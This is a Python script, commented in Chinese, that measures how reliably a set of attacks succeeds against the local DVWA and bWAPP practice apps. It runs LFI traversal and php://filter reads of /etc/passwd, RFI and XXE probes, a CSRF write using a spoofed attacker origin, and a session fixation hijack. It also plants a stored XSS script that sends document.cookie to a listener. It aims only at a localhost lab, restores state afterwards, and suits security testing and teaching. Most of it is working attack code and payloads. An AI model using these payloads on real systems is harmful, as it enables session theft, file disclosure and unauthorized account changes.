#!/usr/bin/env python3
# loop3 t4 probe13: 复现率验证（多轮重复）+ 分级对照
#   B1 LFI ×5、B1 php://filter ×5、B1 RFI 阴性 ×3
#   B2 bWAPP 原生 XXE（内部实体，零写入） ×5
#   B3 CSRF 有 token 对照 ×3 / 无 token 写入+复原 ×3
#   B4 会话固定 ×3（不同自选 ID）
#   B5 存储型 XSS→真实浏览器→Cookie 外带 ×3 + high/impossible 对照
import json, re, subprocess, time, datetime, os, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

BASE = "http://127.0.0.1"
UA = "loop3-t4/1.0 (authorized local lab)"
GAP = 1.2
PORT = 8099
LOG = "/tmp/loop3-t4-probe13-sink.jsonl"
FACTORY = "Any bugs?"
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": [], "rate": {}}


def rec(n, **kw):
    OUT["steps"].append({"step": n, **kw})
    print(f"--- {n}: " + json.dumps(kw, ensure_ascii=False)[:700], flush=True)
    return kw


def sh(c):
    r = subprocess.run(c, shell=True, capture_output=True, text=True)
    return (r.stdout + r.stderr).strip()


def db(q):
    return sh(f'sudo -n mariadb -N -e "{q}"')


class Sink(BaseHTTPRequestHandler):
    def do_GET(self):
        e = {"at": datetime.datetime.now().isoformat(), "path": self.path, "headers": dict(self.headers)}
        open(LOG, "a").write(json.dumps(e) + "\n")
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.end_headers()
        self.wfile.write(b"GIF89a")

    def log_message(self, *a):
        pass


srv = HTTPServer(("127.0.0.1", PORT), Sink)
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.4)


def sink_n():
    return sum(1 for _ in open(LOG)) if os.path.exists(LOG) else 0


def dvwa(level="low"):
    s = requests.Session()
    s.headers["User-Agent"] = UA
    s.cookies.set("security", level, domain="127.0.0.1", path="/")
    r = s.get(BASE + "/dvwa/login.php", timeout=20)
    m = re.search(r"name='user_token' value='([^']+)'", r.text)
    time.sleep(GAP)
    s.post(BASE + "/dvwa/login.php",
           data={"username": "admin", "password": "password", "Login": "Login", "user_token": m.group(1)},
           allow_redirects=False, timeout=20)
    return s


def bwapp(level="0"):
    s = requests.Session()
    s.headers["User-Agent"] = UA
    s.post(BASE + "/bWAPP/login.php",
           data={"login": "bee", "password": "bug", "security_level": level, "form": "submit"},
           allow_redirects=False, timeout=20)
    return s


# ================= B1 LFI 复现率 =================
S = dvwa("low")
S.cookies.set("security", "low", domain="127.0.0.1", path="/")
r1 = {"tries": 0, "ok": 0, "fail": []}
for i in range(5):
    time.sleep(GAP)
    r = S.get(BASE + "/dvwa/vulnerabilities/fi/", params={"page": "../../../../../../etc/passwd"}, timeout=20)
    r1["tries"] += 1
    good = ("root:x:0:0" in r.text and "daemon:" in r.text)
    r1["ok"] += 1 if good else 0
    if not good:
        r1["fail"].append({"round": i + 1, "status": r.status_code, "bytes": len(r.content)})
rec("RATE_B1_traversal_etc_passwd", **r1)
OUT["rate"]["B1_traversal"] = r1

r2 = {"tries": 0, "ok": 0, "fail": []}
for i in range(5):
    time.sleep(GAP)
    r = S.get(BASE + "/dvwa/vulnerabilities/fi/",
              params={"page": "php://filter/convert.base64-encode/resource=../../../../../../etc/passwd"}, timeout=20)
    r2["tries"] += 1
    blobs = re.findall(r"[A-Za-z0-9+/=]{40,}", r.text)
    dec = ""
    if blobs:
        import base64
        try:
            dec = base64.b64decode(blobs[0]).decode("utf-8", "replace")
        except Exception:
            dec = ""
    good = "root:x:0:0" in dec
    r2["ok"] += 1 if good else 0
    if not good:
        r2["fail"].append({"round": i + 1, "status": r.status_code, "b64_found": bool(blobs)})
rec("RATE_B1_phpfilter_base64", **r2)
OUT["rate"]["B1_phpfilter"] = r2

# 负对照（不存在文件）3 轮
r3 = {"tries": 0, "zero_content": 0}
for i in range(3):
    time.sleep(GAP)
    r = S.get(BASE + "/dvwa/vulnerabilities/fi/",
              params={"page": "../../../../../../etc/passwd_loop3_nope_%d" % i}, timeout=20)
    r3["tries"] += 1
    r3["zero_content"] += 1 if "root:x:0:0" not in r.text else 0
rec("RATE_B1_negative_control_missing_file", **r3)

# ================= B1 RFI 阴性 =================
rfi = {"tries": 0, "sink_hits": 0, "executed": 0}
for i in range(3):
    time.sleep(GAP)
    n0 = sink_n()
    r = S.get(BASE + "/dvwa/vulnerabilities/fi/", params={"page": "http://127.0.0.1:%d/shell-%d.txt" % (PORT, i)}, timeout=20)
    rfi["tries"] += 1
    rfi["sink_hits"] += sink_n() - n0
    rfi["executed"] += 1 if "RFI" in r.text else 0
rec("RATE_B1_RFI_negative", **rfi)
OUT["rate"]["B1_RFI"] = rfi

# ================= B2 bWAPP 原生 XXE（零写入形态） =================
B = bwapp("0")
B.cookies.set("security_level", "0", domain="127.0.0.1", path="/")
r4 = {"tries": 0, "ok": 0, "fail": []}
for i in range(5):
    time.sleep(GAP)
    body = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e "LO3-RATE-CANARY-%d">]>'
            '<reset><login>&e;_nosuchuser</login><secret>x</secret></reset>' % i)
    r = B.post(BASE + "/bWAPP/xxe-2.php", data=body.encode(),
               headers={"Content-Type": "text/xml; charset=UTF-8"}, timeout=25)
    r4["tries"] += 1
    good = ("LO3-RATE-CANARY-%d_nosuchuser" % i) in r.text
    r4["ok"] += 1 if good else 0
    if not good:
        r4["fail"].append({"round": i + 1, "status": r.status_code, "resp": r.text[:120]})
rec("RATE_B2_bwapp_native_internal_entity", **r4)
OUT["rate"]["B2"] = r4

# 外部实体对照：low（外部实体不解析）vs 自建靶点（NOENT，已拆除）——此处只测 low 与 medium
r5 = {"low_tries": 0, "low_entity_empty": 0, "medium_tries": 0, "medium_entity_empty": 0}
for lvl, key in (("0", "low"), ("1", "medium")):
    B.cookies.set("security_level", lvl, domain="127.0.0.1", path="/")
    for i in range(3):
        time.sleep(GAP)
        body = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]>'
                '<reset><login>&e;_nosuchuser</login><secret>x</secret></reset>')
        r = B.post(BASE + "/bWAPP/xxe-2.php", data=body.encode(),
                   headers={"Content-Type": "text/xml; charset=UTF-8"}, timeout=25)
        r5[key + "_tries"] += 1
        # 若外部实体被展开，响应里会出现 passwd 内容（root:x:0:0）
        if "root:x:0:0" not in r.text:
            r5[key + "_entity_empty"] += 1
rec("RATE_B2_external_entity_NOT_expanded", **r5, note="bWAPP low/medium/high 均不展开 SYSTEM 实体（PHP 8.4 + libxml 2.15 默认）")
OUT["rate"]["B2_external"] = r5
B.cookies.set("security_level", "0", domain="127.0.0.1", path="/")

# ================= B3 CSRF =================
url_csrf = BASE + "/bWAPP/csrf_3.php"
hdr = {"Origin": "http://attacker.loop3.invalid", "Referer": "http://attacker.loop3.invalid/evil.html"}
# 有 token（medium）对照 ×3 —— 零写入
Bm = bwapp("1")
t3 = {"tries": 0, "blocked": 0}
for i in range(3):
    time.sleep(GAP)
    r = Bm.post(url_csrf, data={"action": "change", "secret": "csrf-rate-blocked-%d" % i, "login": "bee"},
                headers=hdr, timeout=20)
    t3["tries"] += 1
    if "Invalid token" in r.text:
        t3["blocked"] += 1
rec("RATE_B3_token_required_blocked", **t3, db_secret=db("SELECT secret FROM bWAPP.users WHERE login='bee';"))
OUT["rate"]["B3_token"] = t3

# 无 token（low）写入+复原 ×3
Bl = bwapp("0")
t4 = {"tries": 0, "ok": 0, "restored": 0, "fail": []}
for i in range(3):
    mark = "csrf-rate-%s-%d" % (datetime.datetime.now().strftime("%H%M%S"), i)
    time.sleep(GAP)
    r = Bl.post(url_csrf, data={"action": "change", "secret": mark, "login": "bee"}, headers=hdr, timeout=20)
    t4["tries"] += 1
    v = db("SELECT secret FROM bWAPP.users WHERE login='bee';")
    if v == mark:
        t4["ok"] += 1
    else:
        t4["fail"].append({"round": i + 1, "db": v, "resp": r.text[:100]})
    time.sleep(GAP)
    Bl.post(url_csrf, data={"action": "change", "secret": FACTORY, "login": "bee"}, timeout=20)
    if db("SELECT secret FROM bWAPP.users WHERE login='bee';") == FACTORY:
        t4["restored"] += 1
rec("RATE_B3_no_token_write", **t4)
OUT["rate"]["B3_no_token"] = t4

# ================= B4 会话固定 ×3 =================
t5 = {"tries": 0, "ok": 0, "fail": []}
for i in range(3):
    fixed = "loop3ratefix%02d00000000000000000" % i
    s = requests.Session()
    s.headers["User-Agent"] = UA
    s.cookies.set("PHPSESSID", fixed, domain="127.0.0.1", path="/")
    s.cookies.set("security", "low", domain="127.0.0.1", path="/")
    r = s.get(BASE + "/dvwa/login.php", timeout=20)
    m = re.search(r"name='user_token' value='([^']+)'", r.text)
    time.sleep(GAP)
    s.post(BASE + "/dvwa/login.php",
           data={"username": "admin", "password": "password", "Login": "Login", "user_token": m.group(1)},
           allow_redirects=False, timeout=20)
    kept = (s.cookies.get("PHPSESSID") == fixed)
    v = requests.Session()
    v.headers["User-Agent"] = UA
    v.cookies.set("PHPSESSID", fixed, domain="127.0.0.1", path="/")
    rv = v.get(BASE + "/dvwa/index.php", allow_redirects=False, timeout=20)
    hijack = ("Welcome :: Damn Vulnerable Web Application" in rv.text)
    t5["tries"] += 1
    if kept and hijack:
        t5["ok"] += 1
    else:
        t5["fail"].append({"round": i + 1, "id_kept": kept, "hijack": hijack, "status": rv.status_code})
    sh("sudo -n rm -f /var/lib/php/sessions/sess_%s" % fixed)
rec("RATE_B4_session_fixation", **t5)
OUT["rate"]["B4"] = t5

# ================= B5 存储型 XSS ×3 + 分级对照 =================
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.common.by import By

    o = Options()
    o.binary_location = "/usr/bin/chromium"
    for a in ("--headless=new", "--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"):
        o.add_argument(a)
    d = webdriver.Chrome(service=ChromeService(executable_path="/usr/bin/chromedriver"), options=o)
    rec("browser_ready", version=d.capabilities.get("browserVersion"))

    def browser_login(level):
        d.delete_all_cookies()
        d.get(BASE + "/dvwa/login.php")
        d.add_cookie({"name": "security", "value": level, "domain": "127.0.0.1", "path": "/"})
        d.get(BASE + "/dvwa/login.php")
        d.find_element(By.NAME, "username").send_keys("admin")
        d.find_element(By.NAME, "password").send_keys("password")
        d.find_element(By.NAME, "Login").click()
        time.sleep(GAP)

    t6 = {"tries": 0, "ok": 0, "fail": []}
    for i in range(3):
        tag = "LO3RATE%d" % i
        payload = ('<script>new Image().src="http://127.0.0.1:%d/r?t=%s&c="'
                   '+encodeURIComponent(document.cookie)</script>') % (PORT, tag)
        S2 = dvwa("low")
        S2.cookies.set("security", "low", domain="127.0.0.1", path="/")
        time.sleep(GAP)
        S2.post(BASE + "/dvwa/vulnerabilities/xss_s/",
                data={"txtName": "loop3t4rate", "mtxMessage": payload, "btnSign": "Sign Guestbook"}, timeout=20)
        time.sleep(GAP)
        browser_login("low")
        n0 = sink_n()
        d.get(BASE + "/dvwa/vulnerabilities/xss_s/")
        time.sleep(3.0)
        new = [json.loads(l) for l in open(LOG)][n0:] if os.path.exists(LOG) else []
        hit = [h for h in new if ("t=%s" % tag) in h["path"]]
        cookie_leak = bool(hit) and ("PHPSESSID" in (hit[0]["headers"].get("Cookie") or ""))
        t6["tries"] += 1
        if cookie_leak:
            t6["ok"] += 1
        else:
            t6["fail"].append({"round": i + 1, "sink_new": len(new), "hits": [h["path"][:80] for h in new][:3]})
        time.sleep(GAP)
    rec("RATE_B5_stored_xss_cookie_theft", **t6,
        leaked_cookie_sample=([h["headers"].get("Cookie") for h in [json.loads(l) for l in open(LOG)] if "t=LO3RATE0" in h["path"]][:1]))
    OUT["rate"]["B5"] = t6

    # 分级对照：high / impossible 下同一载荷是否还能执行并窃取 cookie
    for lvl in ("high", "impossible"):
        tag = "LO3CTRL" + lvl.upper()[:3]
        payload = ('<script>new Image().src="http://127.0.0.1:%d/r?t=%s&c="'
                   '+encodeURIComponent(document.cookie)</script>') % (PORT, tag)
        S3 = dvwa(lvl)
        S3.cookies.set("security", lvl, domain="127.0.0.1", path="/")
        time.sleep(GAP)
        S3.post(BASE + "/dvwa/vulnerabilities/xss_s/",
                data={"txtName": "loop3t4rate", "mtxMessage": payload, "btnSign": "Sign Guestbook"}, timeout=20)
        time.sleep(GAP)
        browser_login(lvl)
        n0 = sink_n()
        d.get(BASE + "/dvwa/vulnerabilities/xss_s/")
        time.sleep(3.0)
        new = [json.loads(l) for l in open(LOG)][n0:] if os.path.exists(LOG) else []
        hit = [h for h in new if ("t=%s" % tag) in h["path"]]
        rec("CTRL_B5_level", level=lvl, executed=bool(hit), sink_new=len(new),
            raw_script_in_dom=(payload in d.page_source),
            escaped_in_dom=("&lt;script&gt;" in d.page_source),
            document_cookie=d.execute_script("return document.cookie"))
        time.sleep(GAP)
    d.quit()
except Exception as e:
    rec("browser_error", error=repr(e)[:400])

# ---------- 清理与最终态 ----------
rec("cleanup_guestbook", v=db("DELETE FROM dvwa.guestbook WHERE name='loop3t4rate'; SELECT ROW_COUNT();"))
rec("final_guestbook", v=db("SELECT comment_id,name FROM dvwa.guestbook;"))
rec("final_guestbook_count", v=db("SELECT COUNT(*) FROM dvwa.guestbook;"))
rec("final_bwapp_secret", v=db("SELECT login,secret FROM bWAPP.users;"))
rec("final_blog", v=db("SELECT COUNT(*) FROM bWAPP.blog;"))
rec("final_lo3_sessions", v=sh("sudo -n ls /var/lib/php/sessions/ | grep -icE 'loop3|LO3' || echo 0"))

with open("/tmp/loop3-t4-probe13.json", "w") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
srv.shutdown()
print(json.dumps({"rc": "ok", "rates": {k: v for k, v in OUT["rate"].items()}}))
